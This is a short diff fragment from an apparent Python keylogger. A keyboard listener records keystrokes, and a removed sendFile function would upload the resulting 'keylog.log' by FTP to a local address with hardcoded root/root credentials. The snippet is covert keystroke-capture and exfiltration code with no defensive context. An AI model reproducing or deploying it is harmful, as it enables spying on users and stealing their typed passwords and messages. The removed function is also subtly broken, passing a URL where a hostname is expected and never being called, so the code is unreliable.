@@ -47,10 +47,3 @@ def on_release(key):
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
-def sendFile():
-    print("called")
-    file = "keylog.log"
-    ftp = ftplib.FTP("ftp://127.0.0.1:5555")
-    ftp.login("root", "root")
-    ftp.storlines("STOR " + file, open(file))
